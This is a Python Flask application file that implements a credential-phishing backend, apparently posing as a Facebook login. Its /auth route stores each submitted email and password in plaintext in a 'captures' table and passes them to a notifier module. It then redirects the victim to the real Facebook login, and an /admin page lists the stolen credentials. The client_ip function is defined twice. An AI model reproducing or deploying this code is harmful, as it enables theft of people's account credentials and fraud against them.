# language: Python 3.11, file: app.py, target: Flask 3.x, SQLite3, proxy-aware
import os, sqlite3, datetime, functools, ipaddress
from flask import Flask, request, render_template, redirect, g, Response
import config, notifier

app = Flask(__name__)
DB = os.environ.get("DB_PATH", "data.db")

def get_db():
    if "db" not in g:
        g.db = sqlite3.connect(DB)
        g.db.row_factory = sqlite3.Row
    return g.db

@app.teardown_appcontext
def close_db(exc):
    db = g.pop("db", None)
    if db: db.close()

def init_db():
    with sqlite3.connect(DB) as db:
        db.execute("""CREATE TABLE IF NOT EXISTS captures (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT, password TEXT, ip TEXT, ua TEXT, ts TEXT)""")

def client_ip():
    """IP حقيقي، مع تجاهل X-Forwarded-For المزوّر من غير البروكسي الموثوق."""
    remote = request.remote_addr or "?"
    xff = request.headers.get("X-Forwarded-For", "")
    if remote in config.TRUSTED_PROXIES and xff:
        return xff.split(",")[0].strip()
    return remote

def require_auth(f):
    @functools.wraps(f)
    def wrapper(*a, **kw):
        auth = request.authorization
        if not auth or auth.username != config.ADMIN_USER or auth.password != config.ADMIN_PASS:
            return Response("Auth required", 401, {"WWW-Authenticate": 'Basic realm="admin"'})
        return f(*a, **kw)
    return wrapper

def client_ip():
    remote = request.remote_addr or "?"
    xff = request.headers.get("X-Forwarded-For", "")
    if remote in config.TRUSTED_PROXIES and xff:
        return xff.split(",")[0].strip()
    return remote

@app.route("/")
def index():
    return render_template("index.html", site=config.SITE_NAME)

@app.route("/auth", methods=["POST"])
def auth():
    email = request.form.get("email", "")
    password = request.form.get("password", "")
    ip = client_ip()
    ua = request.headers.get("User-Agent", "")[:250]
    ts = datetime.datetime.now(datetime.UTC).isoformat()
    db = get_db()
    db.execute("INSERT INTO captures (email,password,ip,ua,ts) VALUES (?,?,?,?,?)",
               (email, password, ip, ua, ts))
    db.commit()
    notifier.notify(email, password, ip, ua)
    return redirect("https://www.facebook.com/login", code=302)

@app.route("/admin")
@require_auth
def admin():
    db = get_db()
    rows = db.execute("SELECT * FROM captures ORDER BY id DESC").fetchall()
    return render_template("admin.html", rows=rows)

@app.route("/health")
def health():
    return {"status": "ok"}

if __name__ == "__main__":
    init_db()
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=False)
